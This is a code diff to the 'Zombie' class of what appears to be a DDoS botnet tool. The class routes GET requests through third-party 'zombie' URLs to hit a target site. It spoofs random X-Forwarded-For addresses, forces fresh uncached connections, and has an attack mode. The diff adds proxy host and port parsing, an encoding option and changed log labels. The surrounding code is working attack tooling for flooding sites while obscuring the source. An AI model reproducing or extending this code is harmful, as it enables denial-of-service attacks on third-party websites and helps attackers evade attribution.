@@ -72,7 +72,7 @@ class Zombie: # class representing a zombie
             else:                                    
                 url_attack = self.zombie + options.target # Use self.zombie vector to connect to original target url
             if self.ufo.options.verbose:
-                print "[INFO] Payload:", url_attack
+                print "[Info] Payload:", url_attack
             c.setopt(pycurl.URL, url_attack) # GET connection on target site
             c.setopt(pycurl.NOBODY, 0)  # use GET
         # set fake headers (important: no-cache)
@@ -93,6 +93,7 @@ class Zombie: # class representing a zombie
         c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
         c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
         c.setopt(pycurl.NOSIGNAL, 1) # pass 'long' to stack to fix libcurl bug
+        c.setopt(pycurl.ENCODING, "") # use all available encodings (black magic)
         if options.xforw: # set x-forwarded-for
             generate_random_xforw = RandomIP()
             xforwip = generate_random_xforw._generateip('')
@@ -120,9 +121,21 @@ class Zombie: # class representing a zombie
         else:
             c.setopt(pycurl.REFERER, self.ufo.referer)
         if options.proxy: # set proxy
-            c.setopt(pycurl.PROXY, options.proxy)
+            proxy = options.proxy
+            sep = ":"
+            proxy_ip = proxy.rsplit(sep, 1)[0]
+            if proxy_ip.startswith('http://'):
+                proxy_ip = proxy_ip.replace('http://', '')
+            elif proxy_ip.startswith('https://'):
+                proxy_ip = proxy_ip.replace('https://', '')
+            proxy_port = proxy.rsplit(sep, 1)[1]
+            if proxy_ip == '127.0.0.1': # working by using 'localhost' as http proxy (ex: privoxy)
+                proxy_ip = 'localhost'
+            c.setopt(pycurl.PROXY, proxy_ip)
+            c.setopt(pycurl.PROXYPORT, int(proxy_port))
         else:
             c.setopt(pycurl.PROXY, '')
+            c.setopt(pycurl.PROXYPORT, pycurl.PROXYPORT)
         if options.timeout: # set timeout
             c.setopt(pycurl.TIMEOUT, options.timeout)
             c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
@@ -153,19 +166,22 @@ class Zombie: # class representing a zombie
             code_reply = c.getinfo(pycurl.HTTP_CODE)
             reply = b.getvalue()
             if options.verbose:
-                print "Reply:"
+                print "[Info] Reply:"
                 print "\n", reply
-            return code_reply
+            if self.ufo.options.testrpc:
+                return reply
+            else:
+                return code_reply
         if self.ufo.external == True: # External reply
             external_reply = h.getvalue()
             if options.verbose:
-                print "Reply:"
+                print "[Info] Reply:"
                 print "\n", external_reply
             return external_reply
         if self.payload == True: # Payloads reply
             payload_reply = h.getvalue()
             if options.verbose:
-                print "Reply:"
+                print "[Info] Reply:"
                 print "\n", payload_reply
             return payload_reply
         if self.attack_mode == True: # Attack mode reply
